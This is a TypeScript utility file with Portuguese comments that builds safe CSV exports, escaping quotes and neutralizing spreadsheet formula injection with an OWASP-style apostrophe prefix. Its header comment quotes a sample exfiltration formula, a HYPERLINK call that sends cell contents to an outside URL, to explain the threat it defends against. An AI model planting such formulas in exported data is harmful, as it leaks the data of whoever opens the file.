/**
 * Célula de CSV segura para abrir em planilha.
 *
 * Aspas duplicadas e célula entre aspas resolvem o delimitador e a quebra de linha — mas não
 * a INJEÇÃO DE FÓRMULA: o Excel/LibreOffice interpretam como fórmula qualquer célula que
 * comece com `=`, `+`, `-` ou `@` (e TAB/CR, que alguns leitores descartam antes de olhar o
 * primeiro caractere), mesmo entre aspas. Nome de insumo, descrição de item e justificativa
 * vêm de usuário ou de sistema externo (CATMAT, NF-e); um `=HYPERLINK("https://…?"&A1)`
 * cadastrado ali executava na máquina de quem abriu a exportação.
 *
 * Defesa padrão (OWASP): prefixar `'` — a planilha mostra o texto como texto. Número de
 * verdade é isento: `-3.5` não é fórmula, e prefixá-lo quebraria a coluna numérica.
 */

const FORMULA_TRIGGER = /^[=+\-@\t\r]/
/** Número puro (com sinal e decimal opcionais) — não há fórmula possível aí. */
const PLAIN_NUMBER = /^[+-]?\d+(?:[.,]\d+)?$/

export type CsvValue = string | number | null | undefined

/** Uma célula: sempre entre aspas, aspas internas duplicadas, fórmula neutralizada. */
export function csvCell(value: CsvValue): string {
	if (value == null) return '""'
	if (typeof value === "number") return Number.isFinite(value) ? `"${value}"` : '""'
	const text = FORMULA_TRIGGER.test(value) && !PLAIN_NUMBER.test(value) ? `'${value}` : value
	return `"${text.replaceAll('"', '""')}"`
}

/** Uma linha: células escapadas e unidas pelo delimitador (`,` por padrão; SIAFI usa `;`). */
export function csvRow(values: readonly CsvValue[], delimiter = ","): string {
	return values.map(csvCell).join(delimiter)
}

/** Documento CSV inteiro: cabeçalho + linhas. O BOM entra no download (`downloadCsv`). */
export function csvDocument(header: readonly string[], rows: readonly (readonly CsvValue[])[], delimiter = ","): string {
	return [header, ...rows].map((row) => csvRow(row, delimiter)).join("\n")
}

/**
 * Nome de arquivo com a data LOCAL: `preparacoes_2026-09-27.csv`. `toISOString` daria o dia
 * seguinte para quem exporta depois das 21h em Brasília.
 */
export function datedCsvFilename(baseName: string, now = new Date()): string {
	return `${baseName}_${now.toLocaleDateString("sv-SE")}.csv`
}

/** Baixa o CSV no navegador. */
export function downloadCsv(filename: string, csv: string): void {
	// BOM: sem ele o Excel abre o UTF-8 como Latin-1 e estraga todo acento.
	const blob = new Blob(["\uFEFF", csv], { type: "text/csv;charset=utf-8;" })
	const link = document.createElement("a")
	link.href = URL.createObjectURL(blob)
	link.download = filename
	link.click()
	// Revogar no mesmo tick do clique pode cancelar o download onde o blob é lido assíncrono.
	setTimeout(() => URL.revokeObjectURL(link.href), 0)
}
